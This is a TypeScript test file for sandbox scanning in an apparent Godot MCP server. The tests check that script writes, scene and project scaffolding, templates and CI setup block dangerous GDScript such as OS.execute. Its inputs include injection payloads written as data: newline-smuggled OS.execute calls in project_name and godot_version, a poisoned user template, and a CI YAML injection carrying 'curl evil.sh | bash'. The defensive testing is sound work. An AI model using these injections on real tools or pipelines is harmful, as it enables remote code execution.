// SEC-P1-1 (2026-08-08): write_script/edit_script 沙箱扫描守卫测试。
// write/edit 写入 .gd 前对齐 execute_gdscript 走 scanGdscriptSandbox,防 @tool/OS.execute 脚本写入。
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { mkdtempSync, writeFileSync, readFileSync, rmSync, mkdirSync, existsSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';

// Mock import-check 避免 --import 真实 spawn godot
vi.mock('../src/tools/import-check.js', () => ({
  runImport: vi.fn().mockResolvedValue(undefined),
  needsImport: () => false,
  resetImportCache: () => {},
}));

const DANGEROUS_CONTENT = `extends Node

func _ready() -> void:
    OS.execute("calc", [])
`;

const SAFE_CONTENT = `extends Node

func _ready() -> void:
    print("hello")
`;

describe('SEC-P1-1: write_script/edit_script 沙箱扫描', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(tmpdir(), 'mcp-sec-'));
    writeFileSync(join(tmpDir, 'project.godot'), '[application]\nconfig/name="t"\n');
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
    // 清理可能被测试 stub 的 env
    vi.unstubAllEnvs();
  });

  it('write_script 含 OS.execute 被阻断(SANDBOX_VIOLATION)', async () => {
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'write_script',
      project_path: tmpDir,
      script_path: 'test/danger.gd',
      content: DANGEROUS_CONTENT,
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    expect(text).toContain('OS system command');
  });

  it('write_script 正常脚本不受影响', async () => {
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'write_script',
      project_path: tmpDir,
      script_path: 'test/safe.gd',
      content: SAFE_CONTENT,
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('Script written');
  });

  it('write_script 双 opt-in 旁路放行(UNRESTRICTED + DISABLE_SAFETY)', async () => {
    vi.stubEnv('GODOT_MCP_UNRESTRICTED', 'true');
    vi.stubEnv('GODOT_MCP_DISABLE_SAFETY', 'true');
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'write_script',
      project_path: tmpDir,
      script_path: 'test/bypass.gd',
      content: DANGEROUS_CONTENT,
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('Script written');
  });

  it('write_script 单 env 不够(仅 UNRESTRICTED,无 DISABLE_SAFETY)仍阻断', async () => {
    vi.stubEnv('GODOT_MCP_UNRESTRICTED', 'true');
    // 不设 DISABLE_SAFETY / ALLOW_UNSAFE
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'write_script',
      project_path: tmpDir,
      script_path: 'test/single.gd',
      content: DANGEROUS_CONTENT,
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
  });

  it('edit_script search_and_replace 含 OS.execute 被阻断(occurrence=0 全量)', async () => {
    const targetPath = join(tmpDir, 'edit_target.gd');
    writeFileSync(targetPath, 'extends Node\n\nfunc _ready():\n    pass\n');
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'edit_script',
      project_path: tmpDir,
      script_path: 'edit_target.gd',
      search_and_replace: { search: '    pass', replace: '    OS.execute("calc", [])', occurrence: 0 },
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    // 确认文件未被写入(原内容保持)
    expect(readFileSync(targetPath, 'utf-8')).toContain('    pass');
  });

  it('edit_script search_and_replace 含 OS.execute 被阻断(occurrence=1 单次,独立 substring 路径)', async () => {
    // 守护 script.ts 单 occurrence 路径(独立 substring 拼接 finalContent)的沙箱扫描
    const targetPath = join(tmpDir, 'edit_occurrence.gd');
    writeFileSync(targetPath, 'extends Node\n\nfunc a():\n    pass\n\nfunc b():\n    pass\n');
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'edit_script',
      project_path: tmpDir,
      script_path: 'edit_occurrence.gd',
      search_and_replace: { search: '    pass', replace: '    OS.execute("calc", [])', occurrence: 1 },
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    // 确认文件未被写入(两个 pass 都在)
    const after = readFileSync(targetPath, 'utf-8');
    expect(after.match(/    pass/g)?.length).toBe(2);
  });

  it('edit_script 行号模式含 OS.execute 被阻断', async () => {
    const targetPath = join(tmpDir, 'edit_lines.gd');
    writeFileSync(targetPath, 'extends Node\n\nfunc _ready():\n    pass\n');
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'edit_script',
      project_path: tmpDir,
      script_path: 'edit_lines.gd',
      start_line: 4,
      end_line: 4,
      new_content: '    OS.execute("calc", [])',
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    expect(readFileSync(targetPath, 'utf-8')).toContain('    pass');
  });

  it('非 .gd 文件(.cs)跳过沙箱扫描', async () => {
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    // .cs 不应被 scanGdscriptSandbox 拦(它只扫 GDScript 模式)
    const res = await handleTool('script', {
      action: 'write_script',
      project_path: tmpDir,
      script_path: 'test/code.cs',
      content: 'using Godot;\npublic partial class C : Node { public override void _Ready() { OS.Execute("calc"); } }\n',
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('Script written');
    expect(text).not.toContain('SANDBOX_VIOLATION');
  });
});

// SEC-P1-1 续 (2026-08-14 B-1): write_script/edit_script 之外的 3 个 .gd 写入旁路入口
// (quick_scene / batch create_files / templates apply_template)统一接沙箱扫描。
// 根因:三入口直接 writeFileSync 绕过 scanScriptSandboxOrThrow,tscn 绑 ExtResource 后
// 编辑器打开/run_project 即执行 — 与 write_script 同一威胁面。
describe('SEC-P1-1 B-1: 三旁路入口沙箱扫描', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(tmpdir(), 'mcp-sec-b1-'));
    writeFileSync(join(tmpDir, 'project.godot'), '[application]\nconfig/name="t"\n');
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
    vi.unstubAllEnvs();
  });

  it('quick_scene script_content 含 OS.execute 被阻断(场景+脚本均不落盘)', async () => {
    const { handleTool } = await import('../src/tools/scene/index.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('scene', {
      action: 'quick_scene',
      project_path: tmpDir,
      scene_path: 'test/danger.tscn',
      script_path: 'test/danger.gd',
      script_content: DANGEROUS_CONTENT,
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    // 场景与脚本都不能落盘(tscn 绑 ExtResource 即执行向量)
    expect(existsSync(join(tmpDir, 'test/danger.tscn'))).toBe(false);
    expect(existsSync(join(tmpDir, 'test/danger.gd'))).toBe(false);
  });

  it('quick_scene 安全 script_content 正常创建(不误判)', async () => {
    const { handleTool } = await import('../src/tools/scene/index.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('scene', {
      action: 'quick_scene',
      project_path: tmpDir,
      scene_path: 'test/safe.tscn',
      script_path: 'test/safe.gd',
      script_content: SAFE_CONTENT,
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('Created scene');
    expect(existsSync(join(tmpDir, 'test/safe.tscn'))).toBe(true);
    expect(existsSync(join(tmpDir, 'test/safe.gd'))).toBe(true);
  });

  it('batch create_files 危险 .gd 被拒入 failed 且不落盘', async () => {
    const { handleTool } = await import('../src/tools/batch-tools.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('batch', {
      action: 'create_files',
      project_path: tmpDir,
      validate: false,
      files: [{ path: 'scripts/evil.gd', content: DANGEROUS_CONTENT }],
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    const parsed = JSON.parse(text) as { created: number; failed: number; details: { failed: Array<{ path: string; error: string }> } };
    expect(parsed.failed).toBe(1);
    expect(parsed.details.failed[0]!.path).toBe('scripts/evil.gd');
    expect(parsed.details.failed[0]!.error).toContain('SANDBOX_VIOLATION');
    expect(existsSync(join(tmpDir, 'scripts/evil.gd'))).toBe(false);
  });

  it('batch create_files 非 .gd 文件(.tscn/.json)不受沙箱影响正常写入(不误判)', async () => {
    const { handleTool } = await import('../src/tools/batch-tools.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('batch', {
      action: 'create_files',
      project_path: tmpDir,
      validate: false,
      files: [
        { path: 'scenes/main.tscn', content: '[gd_scene format=3]\nOS.execute("calc", [])\n' },
        { path: 'data/cfg.json', content: '{"cmd": "OS.execute(\\"calc\\", [])"}\n' },
      ],
    }, ctx);

    const text = res.content[0].text;
    expect(text).not.toContain('SANDBOX_VIOLATION');
    const parsed = JSON.parse(text) as { created: number; failed: number };
    expect(parsed.created).toBe(2);
    expect(parsed.failed).toBe(0);
    expect(existsSync(join(tmpDir, 'scenes/main.tscn'))).toBe(true);
    expect(existsSync(join(tmpDir, 'data/cfg.json'))).toBe(true);
  });

  it('apply_template 用户模板渲染含 OS.execute 被阻断(.mcp-templates 投毒向量)', async () => {
    // .mcp-templates/ 投毒向量:validateUserTemplate 零内容审查,危险 code 经 apply_template
    // 渲染写 .gd — 修复后该写入点被沙箱扫描拦截
    mkdirSync(join(tmpDir, '.mcp-templates'));
    writeFileSync(join(tmpDir, '.mcp-templates', 'evil.json'), JSON.stringify({
      id: 'user-evil',
      name: 'evil',
      description: 'evil template',
      code: 'extends Node\n\nfunc _ready() -> void:\n    OS.execute("calc", [])\n',
    }));
    const { handleTool } = await import('../src/tools/code-templates.js');
    const res = await handleTool('templates', {
      action: 'apply',
      project_path: tmpDir,
      template_id: 'user-evil',
      script_path: 'scripts/evil.gd',
    }, {});

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    expect(existsSync(join(tmpDir, 'scripts/evil.gd'))).toBe(false);
  });

  it('apply_template 内置安全模板正常写入 .gd(不误判)', async () => {
    const { handleTool } = await import('../src/tools/code-templates.js');
    const res = await handleTool('templates', {
      action: 'apply',
      project_path: tmpDir,
      template_id: 'T001',
      script_path: 'scripts/camera.gd',
      variables: { position: 'Vector3(0, 5, 10)' },
    }, {});

    const text = res.content[0].text;
    expect(text).not.toContain('SANDBOX_VIOLATION');
    expect(text).toContain('applied to scripts/camera.gd');
    expect(existsSync(join(tmpDir, 'scripts/camera.gd'))).toBe(true);
  });
});

// SEC-P1-1 B-1 fix round 1 (2026-08-14): 第 4 个 .gd 写入面 — project create_project。
// 根因:godot_version 无格式校验直接拼接进 scripts/main.gd 的 print Hello 串,且
// scenes/main.tscn 绑 ExtResource 指向它 → run_project 即执行(与 quick_scene/
// create_files/apply_template 三旁路同威胁模型);project_name 经 getScaffoldFiles
// 拼进脚手架 .gd 注释(`# ${className} — ${projectName}`),含换行即变活代码。
// 修复:godot_version 严格 X.Y / X.Y.Z 白名单 + main.gd 与脚手架 .gd 落盘前统一过
// scanScriptSandboxOrThrow(script/shared.ts B-1 注释声明的全仓 .gd 写入不变式)。
describe('SEC-P1-1 B-1: create_project 第4写入面(godot_version / project_name)', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(tmpdir(), 'mcp-sec-b1p-'));
    writeFileSync(join(tmpDir, 'project.godot'), '[application]\nconfig/name="t"\n');
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
    vi.unstubAllEnvs();
  });

  it('create_project godot_version 注入 payload 被拒(INVALID_PARAMS,任何文件不落盘)', async () => {
    const { handleTool } = await import('../src/tools/project.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const newDir = join(tmpDir, 'evil-proj');
    const res = await handleTool('project', {
      action: 'create_project',
      project_path: newDir,
      godot_version: '4.4")\n\tOS.execute("calc" # \'',
    }, ctx);

    expect(res.isError).toBe(true);
    const text = res.content[0].text;
    expect(text).toContain('INVALID_PARAMS');
    expect(text).toContain('godot_version');
    // 校验先于任何落盘:目录根本不创建(mkdir/project.godot/main.tscn/main.gd 均不发生)
    expect(existsSync(newDir)).toBe(false);
  });

  it('create_project godot_version 非法格式被拒(纯数字/尾随空格/四段/非数字段/数字类型)', async () => {
    const { handleTool } = await import('../src/tools/project.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    for (const bad of ['4', '4.4 ', '4.4.1.1', '4.x', 'v4.4', 4.4]) {
      const newDir = join(tmpDir, `bad-${String(bad).replace(/[^a-zA-Z0-9]/g, '_')}`);
      const res = await handleTool('project', {
        action: 'create_project',
        project_path: newDir,
        godot_version: bad,
      }, ctx);
      expect(res.isError, `godot_version=${JSON.stringify(bad)} 应被拒`).toBe(true);
      expect(res.content[0].text, `godot_version=${JSON.stringify(bad)} 错误码`).toContain('INVALID_PARAMS');
      expect(existsSync(newDir)).toBe(false);
    }
  });

  it('create_project 合法版本号正常生成,main.gd 无注入残留', async () => {
    const { handleTool } = await import('../src/tools/project.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const newDir = join(tmpDir, 'ok-proj');
    const res = await handleTool('project', {
      action: 'create_project',
      project_path: newDir,
      godot_version: '4.7.1',
    }, ctx);

    expect(res.isError).not.toBe(true);
    const mainGd = readFileSync(join(newDir, 'scripts', 'main.gd'), 'utf-8');
    expect(mainGd).toContain('print("Hello, Godot 4.7.1!")');
    expect(mainGd).not.toContain('OS.execute');
    const projectGodot = readFileSync(join(newDir, 'project.godot'), 'utf-8');
    expect(projectGodot).toContain('config/features=PackedStringArray("4.7.1")');
  });

  it('create_project 缺省 godot_version 默认 4.7 正常', async () => {
    const { handleTool } = await import('../src/tools/project.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const newDir = join(tmpDir, 'default-proj');
    const res = await handleTool('project', {
      action: 'create_project',
      project_path: newDir,
    }, ctx);

    expect(res.isError).not.toBe(true);
    expect(readFileSync(join(newDir, 'scripts', 'main.gd'), 'utf-8')).toContain('Hello, Godot 4.7!');
  });

  it('create_project template project_name 注释换行注入 OS.execute 被 SANDBOX_VIOLATION 拦截,脚手架 .gd 不落盘', async () => {
    const { handleTool } = await import('../src/tools/project.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const newDir = join(tmpDir, 'evil-tmpl');
    const res = await handleTool('project', {
      action: 'create_project',
      project_path: newDir,
      template: '2d-platformer',
      // getScaffoldFiles 把 projectName 拼进 `# Player — ${projectName}` 注释;换行后第二行是活代码
      project_name: 'X\nOS.execute("calc", []) #',
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    expect(existsSync(join(newDir, 'scripts', 'player.gd'))).toBe(false);
  });

  it('create_project template 正常中文项目名不误判,脚手架 .gd 正常生成', async () => {
    const { handleTool } = await import('../src/tools/project.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const newDir = join(tmpDir, 'ok-tmpl');
    const res = await handleTool('project', {
      action: 'create_project',
      project_path: newDir,
      template: '2d-platformer',
      project_name: '我的平台游戏',
    }, ctx);

    expect(res.isError).not.toBe(true);
    const playerGd = readFileSync(join(newDir, 'scripts', 'player.gd'), 'utf-8');
    expect(playerGd).toContain('# Player — 我的平台游戏');
  });

  it('setup_project_rules(ci=true) godot_version 注入被拒(CI YAML 写入面,workflow 不落盘)', async () => {
    const { handleTool } = await import('../src/tools/project.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('project', {
      action: 'setup_project_rules',
      project_path: tmpDir,
      hooks: false,
      claude_md: false,
      agents_md: false,
      ci: true,
      godot_version: '4.4\n  - name: pwn\n    run: curl evil.sh | bash\n',
    }, ctx);

    expect(res.isError).toBe(true);
    const text = res.content[0].text;
    expect(text).toContain('INVALID_PARAMS');
    expect(text).toContain('godot_version');
    expect(existsSync(join(tmpDir, '.github', 'workflows', 'godot-ci.yml'))).toBe(false);
  });

  // Fix round 1 concern 1 (2026-08-14): generateCiTemplate 的 pre-release 分支
  // (`godotVersion.includes('-')`) 被旧正则入口拒绝成死代码 — 扩展字符集白名单
  // `-[A-Za-z0-9.]+`,覆盖 Godot 官方 pre-release 命名(4.4.1-rc1 / 4.4-beta2)。
  it('create_project godot_version pre-release 版本号(4.4.1-rc1 / 4.4-beta2)通过校验', async () => {
    const { handleTool } = await import('../src/tools/project.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    for (const pre of ['4.4.1-rc1', '4.4-beta2']) {
      const newDir = join(tmpDir, `pre-${pre.replace(/[^a-zA-Z0-9]/g, '_')}`);
      const res = await handleTool('project', {
        action: 'create_project',
        project_path: newDir,
        godot_version: pre,
      }, ctx);

      expect(res.isError, `godot_version=${pre} 是合法 pre-release,应放行`).not.toBe(true);
      const mainGd = readFileSync(join(newDir, 'scripts', 'main.gd'), 'utf-8');
      expect(mainGd).toContain(`Hello, Godot ${pre}!`);
      expect(mainGd).not.toContain('OS.execute');
    }
  });

  it('create_project godot_version pre-release 扩展后注入仍被拒(- 后含引号/换行非法字符)', async () => {
    const { handleTool } = await import('../src/tools/project.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const newDir = join(tmpDir, 'evil-pre');
    const res = await handleTool('project', {
      action: 'create_project',
      project_path: newDir,
      // `-` 前缀是合法 pre-release 形态,但后随引号+换行+OS.execute — 字符集白名单外
      godot_version: '4.4")\nOS.execute("calc" # -x',
    }, ctx);

    expect(res.isError).toBe(true);
    const text = res.content[0].text;
    expect(text).toContain('INVALID_PARAMS');
    expect(text).toContain('godot_version');
    expect(existsSync(newDir)).toBe(false);
  });
});

// Task D3 (2026-11-12 反馈批次): edit_script 沙箱扫描对象改增量。
// 反馈根因:edit.ts 三处调用点扫「写入后全文」,既有 .gd 内合法的 FileAccess.WRITE 存档 /
// load(常量) 非字面量加载触发 SANDBOX_VIOLATION,阻断一切无关编辑(2026-11-06 起 8 次复现)。
// 设计决策(与 write_script 威胁模型差异):
// - write_script 不变:新文件/整文件覆盖,扫全部新内容;
// - edit_script 只扫「本次编辑新增内容」:search_and_replace 的 replace 段、行模式的新行。
//   既有文件中的危险模式不再拦(已在盘上,编辑行为不改变其存在);replace 段新引入的
//   危险模式(Phase 1 正则 / Phase 2 字符串拼接 / Phase 3 非字面量 load)仍拦。
describe('Task D3: edit_script 沙箱扫描收窄到增量内容', () => {
  // 既有合法但含沙箱敏感 API 的脚本(FileAccess.WRITE 存档 + load(常量) 资源加载)。
  // 全量扫描下这两行分别触发 'File write access'(Phase 1)与
  // 'load() with non-literal path'(Phase 3),任何无关编辑被整体阻断 — 根因复现素材。
  const EXISTING_SENSITIVE = [
    'extends Node',
    '',
    'const BTN_RES := "res://assets/btn.png"',
    '',
    'func save_game(path: String) -> void:',
    '\tvar f = FileAccess.open(path, FileAccess.WRITE)',
    '\tf.store_line("saved")',
    '',
    'func load_icon() -> Texture2D:',
    '\treturn load(BTN_RES)',
    '',
    'func _ready() -> void:',
    '\tprint("ready")',
    '',
  ].join('\n');

  let tmpDir: string;

  beforeEach(() => {
    tmpDir = mkdtempSync(join(tmpdir(), 'mcp-sec-d3-'));
    writeFileSync(join(tmpDir, 'project.godot'), '[application]\nconfig/name="t"\n');
  });

  afterEach(() => {
    rmSync(tmpDir, { recursive: true, force: true });
    vi.unstubAllEnvs();
  });

  // ── 既有敏感代码 + 无关编辑 → 不再误拦(修复主断言,实现前红) ──

  it('既有 FileAccess.WRITE/load(BTN_RES):search_and_replace 全量替换无关行不被误拦', async () => {
    const targetPath = join(tmpDir, 'edit_inc0.gd');
    writeFileSync(targetPath, EXISTING_SENSITIVE);
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'edit_script',
      project_path: tmpDir,
      script_path: 'edit_inc0.gd',
      auto_validate: false,
      search_and_replace: { search: 'print("ready")', replace: 'print("ready v2")', occurrence: 0 },
    }, ctx);

    const text = res.content[0].text;
    expect(text).not.toContain('SANDBOX_VIOLATION');
    // 编辑真实落盘(无关行被替换,既有敏感行原样保留)
    const after = readFileSync(targetPath, 'utf-8');
    expect(after).toContain('print("ready v2")');
    expect(after).toContain('FileAccess.open(path, FileAccess.WRITE)');
    expect(after).toContain('load(BTN_RES)');
  });

  it('既有 FileAccess.WRITE/load(BTN_RES):search_and_replace 单 occurrence 无关行不被误拦', async () => {
    const targetPath = join(tmpDir, 'edit_inc1.gd');
    writeFileSync(targetPath, EXISTING_SENSITIVE);
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'edit_script',
      project_path: tmpDir,
      script_path: 'edit_inc1.gd',
      auto_validate: false,
      search_and_replace: { search: 'print("ready")', replace: 'print("ready v2")', occurrence: 1 },
    }, ctx);

    const text = res.content[0].text;
    expect(text).not.toContain('SANDBOX_VIOLATION');
    expect(readFileSync(targetPath, 'utf-8')).toContain('print("ready v2")');
  });

  it('既有 FileAccess.WRITE/load(BTN_RES):行号模式编辑无关行不被误拦', async () => {
    const targetPath = join(tmpDir, 'edit_incln.gd');
    writeFileSync(targetPath, EXISTING_SENSITIVE);
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'edit_script',
      project_path: tmpDir,
      script_path: 'edit_incln.gd',
      auto_validate: false,
      start_line: 13,
      end_line: 13,
      new_content: '\tprint("ready v2")',
    }, ctx);

    const text = res.content[0].text;
    expect(text).not.toContain('SANDBOX_VIOLATION');
    const after = readFileSync(targetPath, 'utf-8');
    expect(after).toContain('print("ready v2")');
    expect(after).toContain('FileAccess.open(path, FileAccess.WRITE)');
  });

  // ── replace 段/新行新引入危险模式 → 仍拦(负向防护,实现前后均应绿) ──

  it('replace 段含 Thread.new() 仍拦(occurrence=0)', async () => {
    const targetPath = join(tmpDir, 'edit_thr0.gd');
    writeFileSync(targetPath, 'extends Node\n\nfunc _ready():\n    pass\n');
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'edit_script',
      project_path: tmpDir,
      script_path: 'edit_thr0.gd',
      auto_validate: false,
      search_and_replace: { search: '    pass', replace: '    var t = Thread.new()', occurrence: 0 },
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    expect(text).toContain('Thread creation');
    expect(readFileSync(targetPath, 'utf-8')).toContain('    pass');
  });

  it('replace 段含 Thread.new() 仍拦(occurrence=1 单次路径)', async () => {
    const targetPath = join(tmpDir, 'edit_thr1.gd');
    writeFileSync(targetPath, 'extends Node\n\nfunc a():\n    pass\n\nfunc b():\n    pass\n');
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'edit_script',
      project_path: tmpDir,
      script_path: 'edit_thr1.gd',
      auto_validate: false,
      search_and_replace: { search: '    pass', replace: '    var t = Thread.new()', occurrence: 1 },
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    expect(text).toContain('Thread creation');
    expect(readFileSync(targetPath, 'utf-8')).toContain('    pass');
  });

  it('replace 段含 FileAccess.WRITE 仍拦(本次编辑新引入写文件向量)', async () => {
    const targetPath = join(tmpDir, 'edit_fwr.gd');
    writeFileSync(targetPath, 'extends Node\n\nfunc _ready():\n    pass\n');
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'edit_script',
      project_path: tmpDir,
      script_path: 'edit_fwr.gd',
      auto_validate: false,
      search_and_replace: { search: '    pass', replace: '    var f = FileAccess.open("/tmp/x", FileAccess.WRITE)', occurrence: 0 },
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    expect(readFileSync(targetPath, 'utf-8')).toContain('    pass');
  });

  it('replace 段含拼接绕过 str("OS")+".execute" 仍拦(Phase 2 语义对增量生效)', async () => {
    const targetPath = join(tmpDir, 'edit_concat.gd');
    writeFileSync(targetPath, 'extends Node\n\nfunc _ready():\n    pass\n');
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'edit_script',
      project_path: tmpDir,
      script_path: 'edit_concat.gd',
      auto_validate: false,
      search_and_replace: { search: '    pass', replace: '    var api = str("OS")+".execute"', occurrence: 0 },
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    expect(text).toContain('String concatenation bypass');
    expect(readFileSync(targetPath, 'utf-8')).toContain('    pass');
  });

  it('replace 段含 load(变量) 非字面量仍拦(Phase 3 tokenizer 对增量生效)', async () => {
    const targetPath = join(tmpDir, 'edit_dynload.gd');
    writeFileSync(targetPath, 'extends Node\n\nfunc _ready():\n    pass\n');
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'edit_script',
      project_path: tmpDir,
      script_path: 'edit_dynload.gd',
      auto_validate: false,
      search_and_replace: { search: '    pass', replace: '    var tex = load(BTN_RES)', occurrence: 0 },
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    expect(readFileSync(targetPath, 'utf-8')).toContain('    pass');
  });

  it('行模式新行含 Thread.new() 仍拦', async () => {
    const targetPath = join(tmpDir, 'edit_thrln.gd');
    writeFileSync(targetPath, 'extends Node\n\nfunc _ready():\n    pass\n');
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'edit_script',
      project_path: tmpDir,
      script_path: 'edit_thrln.gd',
      auto_validate: false,
      start_line: 4,
      end_line: 4,
      new_content: '    var t = Thread.new()',
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    expect(text).toContain('Thread creation');
    expect(readFileSync(targetPath, 'utf-8')).toContain('    pass');
  });

  it('行模式新行含拼接绕过 str("OS")+".execute" 仍拦(Phase 2 对增量生效)', async () => {
    const targetPath = join(tmpDir, 'edit_concatln.gd');
    writeFileSync(targetPath, 'extends Node\n\nfunc _ready():\n    pass\n');
    const { handleTool } = await import('../src/tools/script.js');
    const ctx = { findGodot: async () => '/fake/godot' };
    const res = await handleTool('script', {
      action: 'edit_script',
      project_path: tmpDir,
      script_path: 'edit_concatln.gd',
      auto_validate: false,
      start_line: 4,
      end_line: 4,
      new_content: '    var api = str("OS")+".execute"',
    }, ctx);

    const text = res.content[0].text;
    expect(text).toContain('SANDBOX_VIOLATION');
    expect(text).toContain('String concatenation bypass');
    expect(readFileSync(targetPath, 'utf-8')).toContain('    pass');
  });
});
